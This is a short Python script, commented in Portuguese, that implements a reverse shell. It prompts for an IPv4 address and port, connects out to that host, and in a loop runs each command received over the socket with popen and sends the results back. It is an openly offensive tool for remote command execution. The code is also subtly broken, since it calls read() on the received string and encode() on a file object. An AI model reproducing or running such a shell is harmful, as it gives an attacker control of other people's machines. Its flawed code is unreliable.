from os import system, popen
from socket import AF_INET, SOCK_STREAM, socket, inet_aton
from types import NoneType
#____import struct

static = staticmethod
void = NoneType

class ReverseShell():
    
    @static
    def get_args() -> void:
        ip: str = str(input("IPv4: "))
        port: str = int(input("Porta: "))
        # catch error
        validate_ip: bytes = inet_aton(ip)
        # else
        ReverseShell.run(ip,port)
        
    @static
    def run(ip, port) -> void:
        sk = socket(AF_INET, SOCK_STREAM)
        sk.connect((ip, port))
        print("Shell reversa rodando em {}:{}".format(ip,port))
        while 1:
            comando = sk.recv(1024).decode()
            resultado = popen(comando.read())
            sk.send(resultado.encode())


if __name__ == "__main__":
    ReverseShell.get_args()